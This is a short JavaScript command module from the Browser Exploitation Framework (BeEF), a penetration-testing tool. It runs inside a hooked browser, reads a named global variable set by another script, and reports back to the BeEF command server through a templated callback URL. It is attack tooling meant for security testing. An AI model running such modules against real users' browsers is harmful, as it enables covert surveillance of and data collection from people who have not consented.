//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*
This JavaScript gets value of the specified variable that was set in another script via Window property.
*/

beef.execute(function() {

 var payload = "<%= @payload_name %>";
 var curl = "<%= @command_url %>";
 var cid = "<%= @command_id %>";
 
 beef.debug("The current value of " + payload + " is " + Window[payload]);
 beef.net.send(curl, parseInt(cid),'get_variable=true');

});
